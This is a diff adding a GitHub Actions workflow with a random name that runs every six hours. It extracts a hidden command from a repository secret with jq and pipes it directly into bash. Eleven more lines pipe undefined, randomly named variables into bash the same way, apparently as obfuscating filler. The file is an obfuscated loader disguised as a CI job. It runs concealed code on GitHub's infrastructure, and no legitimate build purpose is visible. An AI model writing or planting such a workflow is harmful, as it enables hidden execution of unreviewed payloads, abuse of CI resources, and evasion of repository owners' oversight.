@@ -1,0 +1,27 @@
+name: jufuwuhong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jufuwuhong
+        env:
+          dnqcm39: ${{ secrets.dnqcm39 }}
+        run: |
+          echo $dnqcm39 | jq -r .lwfmi02 | /bin/bash
+          echo $a87 | jq -r .a623 | /bin/bash
+          echo $sa307 | jq -r .tthld05 | /bin/bash
+          echo $rk040 | jq -r .gi4102 | /bin/bash
+          echo $ceh3926 | jq -r .g36353 | /bin/bash
+          echo $fiv36937 | jq -r .lsxvn1641 | /bin/bash
+          echo $u2 | jq -r .mm10 | /bin/bash
+          echo $tmi63857 | jq -r .t16 | /bin/bash
+          echo $mmgnl7 | jq -r .j7 | /bin/bash
+          echo $nkz660 | jq -r .ojdi887 | /bin/bash
+          echo $r0528 | jq -r .zbl7 | /bin/bash
+          echo $krtwn05288 | jq -r .a42216 | /bin/bash
+
